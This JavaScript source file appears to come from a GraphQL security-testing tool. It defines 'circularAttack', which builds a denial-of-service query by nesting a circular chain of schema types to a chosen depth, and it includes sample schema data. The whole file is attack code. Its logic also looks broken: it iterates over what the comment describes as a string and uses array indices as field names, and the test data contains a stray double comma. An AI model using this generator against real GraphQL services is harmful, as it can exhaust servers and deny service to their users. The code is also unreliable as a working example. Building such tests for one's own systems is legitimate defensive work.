/*
  format of data we are expecting:
  an array of Schema that make circular logic
  ex. ['User', 'Location', 'Third']

  Want to create a nested query, and then make sure to add a non-circular subfield as final add
  */

export const circularAttack = (circularSchema, parsedSchema, schemaTypes, complexity) => {
  let workingSchema = circularSchema[0]
  let finalOption;
  let constructingQuery = ''

  workingSchema.forEach((key, value) => {
    finalOption = value;
    constructingQuery += ` ${value} {`
  });

  //creating an array of subfields for the final element in the circular attack; this cannot be in the Schema Types
  let finalSubFieldOptions = [];

  const schemaTypesLowerCase = schemaTypes.map(element => {
    return element.toLowerCase();
  })
  
  parsedSchema.forEach(object => {
    
    for (let [key,value] of Object.entries(object)){
      if (value === finalOption){
        const fields = object.fields
        fields.forEach(element => {
          if (!schemaTypesLowerCase.includes(element.name))
          finalSubFieldOptions.push(element.name)
        })     
      }   
    }  
  })

  //Determine parens to add to the end; The 1 accounts for the addition in attackQuery variable
  const closingParens = 1 + (complexity * circularSchema.length)

  let attackQuery = `query { ${constructingQuery.repeat(complexity)} ${finalSubFieldOptions[0]} ${'}'.repeat(closingParens)}`
    
  return attackQuery
}


const testData = [
  {name: 'NotConnected',   fields:[    {name: 'id', type: 'ID'},    {name: 'user', type:'User'}    ]  },
  {name: 'User',   fields:[    {name: 'id', type: 'ID'},     {name: 'location', type:'Location'},    {name: 'cohort', type: 'String'}    ]  }, 
  {name: 'Location',   fields:[    {name: 'id', type: 'ID'},    {name: 'gps', type: 'Number'},    {name: 'user', type:'Third'}    ]  },
  {name: 'Third',   fields:[    {name: 'id', type: 'ID'},    {name: 'user', type:'User'}, ,    {name: 'cabbages', type:'cabbage'}  ]  }  
]